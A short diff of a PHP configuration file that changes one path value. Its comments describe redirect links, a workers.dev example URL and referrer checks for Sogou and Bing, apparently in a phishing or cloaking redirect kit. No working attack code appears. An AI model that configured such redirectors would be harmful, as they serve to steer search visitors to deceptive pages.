@@ -12,7 +12,7 @@ define('FAKE_BD_RE',true);
 // EX: https://strongemoreiz.pearly.workers.dev/?bbre=oUfphz#ld-
 $linkRE="";
 // ex: "/pa1/pa2/pa3" or "/path1/patjh2"
-$wordshash="/appap";
+$wordshash="/pp";
 // config if domain index is root (sogou must config same same link rediret to check rerfer
 // IF NOT use with SOGOU.COM edit $wordshashjs=""
 // config bing: word/a@aa.com on  => $wordshashjs="word/";  ( link use bing/....u=CHAR_OFBING#word/CODEGRAB
